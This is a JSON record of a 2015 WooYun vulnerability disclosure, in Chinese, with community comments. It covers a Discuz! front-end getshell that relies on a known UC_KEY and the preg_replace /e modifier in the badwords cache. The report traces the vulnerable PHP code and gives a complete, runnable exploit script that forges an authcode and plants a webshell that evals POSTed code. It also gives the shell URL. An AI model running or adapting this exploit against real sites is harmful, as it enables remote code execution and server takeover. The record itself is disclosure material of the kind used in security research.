{"id": 71486, "wybug_id": "wooyun-2015-0137991", "wybug_title": "Discuz利用UC_KEY进行前台getshell2", "wybug_corp": "Discuz!", "wybug_author": "Jannock", "wybug_date": "2015-08-31 10:02", "wybug_open_date": "2015-11-29 13:00", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "15", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["代码执行"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-31：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-31：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-03：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-10-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-04：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-14：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-11-29：\t细节向公众公开  简要描述： http://drops.wooyun.org/papers/7830其实这里已经说得比较明白了。利用这个漏洞已经好些时候，包括之前腾讯的shell(http://www.wooyun.org/bugs/wooyun-2010-092923)不过好像官方还是不太重视，特意再提一下，不用登陆后台，直接前台能利用（顺便打卡^-^）乌云搜索uc_key会有很多惊喜哦。 详细说明：  \\api\\uc.php\nfunction updatebadwords($get, $post) {  global $_G;  if(!API_UPDATEBADWORDS) {   return API_RETURN_FORBIDDEN;  }  $data = array();  if(is_array($post)) {   foreach($post as $k => $v) {    $data['findpattern'][$k] = $v['findpattern'];    $data['replace'][$k] = $v['replacement'];   }  }  $cachefile = DISCUZ_ROOT.'./uc_client/data/cache/badwords.php';  $fp = fopen($cachefile, 'w');  $s = \"<?php\\r\\n\";  $s .= '$_CACHE[\\'badwords\\'] = '.var_export($data, TRUE).\";\\r\\n\";  fwrite($fp, $s);  fclose($fp);  return API_RETURN_SUCCEED; }\n更新 uc_client/data/cache/badwords.php再看\\source\\module\\forum\\forum_ajax.php\nif($_GET['action'] == 'checkusername') { $username = trim($_GET['username']); $usernamelen = dstrlen($username); if($usernamelen < 3) {  showmessage('profile_username_tooshort', '', array(), array('handle' => false)); } elseif($usernamelen > 15) {  showmessage('profile_username_toolong', '', array(), array('handle' => false)); } loaducenter(); $ucresult = uc_user_checkname($username);\n跟踪 uc_user_checkname\nfunction uc_user_checkname($username) { return call_user_func(UC_API_FUNC, 'user', 'check_username', array('username'=>$username));}define('UC_API_FUNC', UC_CONNECT == 'mysql' ? 'uc_api_mysql' : 'uc_api_post');\n默认情况下UC_API_FUNC为 uc_api_mysql\nfunction uc_api_mysql($model, $action, $args=array()) { global $uc_controls; if(empty($uc_controls[$model])) {  include_once UC_ROOT.'./lib/db.class.php';  include_once UC_ROOT.'./model/base.php';  include_once UC_ROOT.\"./control/$model.php\";  eval(\"\\$uc_controls['$model'] = new {$model}control();\"); } if($action{0} != '_') {  $args = uc_addslashes($args, 1, TRUE);  $action = 'on'.$action;  $uc_controls[$model]->input = $args;  return $uc_controls[$model]->$action($args); } else {  return ''; }}\n继续跟综到\nfunction check_usernamecensor($username) {  $_CACHE['badwords'] = $this->base->cache('badwords');  $censorusername = $this->base->get_setting('censorusername');  $censorusername = $censorusername['censorusername'];  $censorexp = '/^('.str_replace(array('\\\\*', \"\\r\\n\", ' '), array('.*', '|', ''), preg_quote(($censorusername = trim($censorusername)), '/')).')$/i';  $usernamereplaced = isset($_CACHE['badwords']['findpattern']) && !empty($_CACHE['badwords']['findpattern']) ? @preg_replace($_CACHE['badwords']['findpattern'], $_CACHE['badwords']['replace'], $username) : $username;  if(($usernamereplaced != $username) || ($censorusername && preg_match($censorexp, $username))) {   return FALSE;  } else {   return TRUE;  } }\n注意到@preg_replace($_CACHE['badwords']['findpattern'], $_CACHE['badwords']['replace'], $username)两个参数都可控，即可造成命令执行。   漏洞证明：  利用脚本，3.2后要加上 formhash + cookie 绕过xss拦截\n<?php    $timestamp = time()+10*3600;    $host=\"www.host.com\";    $agent= md5(\"Mozilla/5.0 (Windows NT 6.1; rv:27.0) Gecko/20100101 Firefox/27.0\");    $uc_key=\"uckey\";    $code=urlencode(_authcode(\"agent=$agent&time=$timestamp&action=updatebadwords\", 'ENCODE', $uc_key));       $cmd1='<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><root> <item id=\"0\">  <item id=\"findpattern\">/admin/e</item>  <item id=\"replacement\">@preg_replace(chr(47).chr(47).chr(101),$_POST[c],chr(098));</item> </item></root>';   /* $cmd1='<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?><root></root>'; */    $html1 = send($cmd1);    echo $html1;        function send($cmd){    global $host,$code;    $message = \"POST /api/uc.php?code=\".$code.\"  HTTP/1.1\\r\\n\";    $message .= \"Accept: */*\\r\\n\";    $message .= \"Referer: \".$host.\"\\r\\n\";    $message .= \"Accept-Language: zh-cn\\r\\n\";    $message .= \"Content-Type: application/x-www-form-urlencoded\\r\\n\";    $message .= \"User-Agent: Mozilla/5.0 (Windows NT 6.1; rv:27.0) Gecko/20100101 Firefox/27.0\\r\\n\";    $message .= \"Host: \".$host.\"\\r\\n\";    $message .= \"Content-Length: \".strlen($cmd).\"\\r\\n\";    $message .= \"Connection: Close\\r\\n\\r\\n\";    $message .= $cmd;        $fp = fsockopen($host, 80);    fputs($fp, $message);        $resp = '';    while ($fp && !feof($fp))        $resp .= fread($fp, 1024);        return $resp;}function _authcode($string, $operation = 'DECODE', $key = '', $expiry = 0) {    $ckey_length = 4;    $key = md5($key ? $key : UC_KEY);    $keya = md5(substr($key, 0, 16));    $keyb = md5(substr($key, 16, 16));    $keyc = $ckey_length ? ($operation == 'DECODE' ? substr($string, 0, $ckey_length): substr(md5(microtime()), -$ckey_length)) : '';    $cryptkey = $keya.md5($keya.$keyc);    $key_length = strlen($cryptkey);    $string = $operation == 'DECODE' ? base64_decode(substr($string, $ckey_length)) : sprintf('%010d', $expiry ? $expiry + time() : 0).substr(md5($string.$keyb), 0, 16).$string;    $string_length = strlen($string);    $result = '';    $box = range(0, 255);    $rndkey = array();    for($i = 0; $i <= 255; $i++) {        $rndkey[$i] = ord($cryptkey[$i % $key_length]);    }    for($j = $i = 0; $i < 256; $i++) {        $j = ($j + $box[$i] + $rndkey[$i]) % 256;        $tmp = $box[$i];        $box[$i] = $box[$j];        $box[$j] = $tmp;    }    for($a = $j = $i = 0; $i < $string_length; $i++) {        $a = ($a + 1) % 256;        $j = ($j + $box[$a]) % 256;        $tmp = $box[$a];        $box[$a] = $box[$j];        $box[$j] = $tmp;        $result .= chr(ord($string[$i]) ^ ($box[($box[$a] + $box[$j]) % 256]));    }    if($operation == 'DECODE') {        if((substr($result, 0, 10) == 0 || substr($result, 0, 10) - time() > 0) && substr($result, 10, 16) == substr(md5(substr($result, 26).$keyb), 0, 16)) {            return substr($result, 26);        } else {                return '';            }    } else {        return $keyc.str_replace('=', '', base64_encode($result));    }}?>\n提交后，shell地址为：http://127.0.0.1/forum.php?mod=ajax&inajax=yes&infloat=register&handlekey=register&ajaxmenu=1&action=checkusername&username=admin    修复方案：  http://drops.wooyun.org/papers/7830 里说得很清楚了。   版权声明：转载请注明来源 Jannock@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：低 漏洞Rank：1  确认时间：2015-08-31 12:59 厂商回复： 此问题已经修复过，请使用我们的最新版本。感谢你对discuz的关注 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-31 10:04 |    \t\t染血の雪 \t\t\t( 普通白帽子  |\t\t\t        Rank:193 漏洞数:30        | 击缻)\t\t \n  前排膜拜    \n     2015-08-31 10:04 |    \t\t爱上平顶山  \t\t\t( 核心白帽子 |\t\t\t        Rank:2828 漏洞数:566        | [不戴帽子]异乡过客.曾就职于天朝某机构.IT...)\t\t \n  吊 我来膜拜了    \n     2015-08-31 10:06 |    \t\tfuckadmin \t\t\t( 普通白帽子  |\t\t\t        Rank:560 漏洞数:78        | 千里之堤溃于蚁穴)\t\t \n  打卡    \n     2015-08-31 10:07 |    \t\t无名 \t\t\t( 实习白帽子  |\t\t\t        Rank:41 漏洞数:9        | 我是一只小菜鸟呀，伊雅伊尔哟。)\t\t \n  过来膜拜。。    \n     2015-08-31 10:12 |    \t\t蓝冰 \t\t\t( 普通白帽子  |\t\t\t        Rank:652 漏洞数:52        | -.-)\t\t \n  膜拜 mark 希望有 dz x  xss过滤的突破方法 要不然  payload 被拦截啊    \n     2015-08-31 10:15 |    \t\tharbour_bin \t\t\t( 普通白帽子  |\t\t\t        Rank:469 漏洞数:59        | 沉淀一下, 好好研究一些东西...)\t\t \n  膜拜    \n     2015-08-31 10:20 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:245 漏洞数:63        | 潜心代码审计。)\t\t \n  前来膜拜    \n     2015-08-31 10:21 |    \t\t大亮 \t\t\t( 普通白帽子  |\t\t\t        Rank:333 漏洞数:67        | 慢慢挖洞)\t\t \n  我的输入法现在每次想打“一个”，排在第一个的一直是“一哥”，改不回去了，肿么办    \n     2015-08-31 10:26 |    \t\t泳少 \t\t\t( 普通白帽子  |\t\t\t        Rank:232 漏洞数:80        | ★           梦想这条路踏上了，跪着也要...)\t\t \n  前排    \n     2015-08-31 10:28 |    \t\tif、so  \t\t\t( 核心白帽子 |\t\t\t        Rank:1052 漏洞数:94        | 梦想还是要有的，万一实现了呢？)\t\t \n  一哥！    \n     2015-08-31 10:29 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:495 漏洞数:125        | 茶凉了，就不要再续了，再续也不是原来的味...)\t\t \n  @爱上平顶山 @Jannock Discuz X1.5 X2.5 X3 uc_key getshell  会不会和这个同原理？    \n     2015-08-31 10:39 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1234 漏洞数:122        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  我靠 膜拜了    \n     2015-08-31 10:45 |    \t\t带馅儿馒头 \t\t\t( 核心白帽子 |\t\t\t        Rank:1291 漏洞数:144        | 心在，梦在)\t\t \n  膜拜一哥    \n     2015-08-31 10:46 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:6        | 每日必关注乌云)\t\t \n  参见教主！教主千秋万载，一统江湖！    \n     2015-08-31 10:51 |    \t\tMark \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:2        | 渗透你的心)\t\t \n  吊    \n     2015-08-31 11:13 |    \t\tChora \t\t\t( 普通白帽子  |\t\t\t        Rank:337 漏洞数:22        | 生存、生活、生命。)\t\t \n  来打卡膜拜一哥。    \n     2015-08-31 11:42 |    \t\tpx1624 \t\t\t( 普通白帽子  |\t\t\t        Rank:1038 漏洞数:177        | px1624)\t\t \n  前台好啊！    \n     2015-08-31 12:05 |    \t\tM4sk \t\t\t( 普通白帽子  |\t\t\t        Rank:1213 漏洞数:321        | 国内信息安全任重而道远，还需要厂商和白帽...)\t\t \n  mark    \n     2015-08-31 12:30 |    \t\t放开那个漏洞,让我来 \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:2        | 正在尝试加载简介中.........)\t\t \n  我来膜拜了    \n     2015-08-31 12:49 |    \t\txy小雨 \t\t\t( 普通白帽子  |\t\t\t        Rank:175 漏洞数:52        | 成为海贼王的男人)\t\t \n  永远的一哥    \n     2015-08-31 13:01 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:495 漏洞数:125        | 茶凉了，就不要再续了，再续也不是原来的味...)\t\t \n  永远的一哥（永远的1rank）o(∩_∩)o     \n     2015-08-31 13:42 |    \t\t小白鼠 \t\t\t( 路人 |\t\t\t        Rank:1 漏洞数:1        | 小呀小呀小白鼠)\t\t \n  前台还没听说过，不过key如何来呢！    \n     2015-08-31 14:21 |    \t\t蓝冰 \t\t\t( 普通白帽子  |\t\t\t        Rank:652 漏洞数:52        | -.-)\t\t \n  永远的一哥（永远的1rank）o(∩_∩)o    \n     2015-08-31 15:46 |    \t\tzeracker  \t\t\t( 核心白帽子 |\t\t\t        Rank:1077 漏洞数:139        | 多乌云、多机会!微信公众号: id:a301zls   ...)\t\t \n  一哥 1分    \n     2015-08-31 16:00 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:495 漏洞数:125        | 茶凉了，就不要再续了，再续也不是原来的味...)\t\t \n  @zeracker 帮我审核一下洞 管理大哥 中企动力的    \n     2015-08-31 16:46 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1317 漏洞数:191        | 。)\t\t \n  额⋯⋯早知道我也这样来个    \n     2015-09-04 21:18 |    \t\t晏子 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:4        | 无)\t\t \n  mark一下    \n     2015-11-04 14:40 |    \t\t酷帥王子 \t\t\t( 普通白帽子  |\t\t\t        Rank:118 漏洞数:36        | 天朗日清，和风送闲，可叹那俊逸如我顾影自...)\t\t \n  如果目标是www.xxoo.com/bbs/的那host那里又该怎么填写    \n  \n\n\n", "wybug_level_fromcorp": "低", "wybug_rank_fromcorp": 1, "Ranks": null}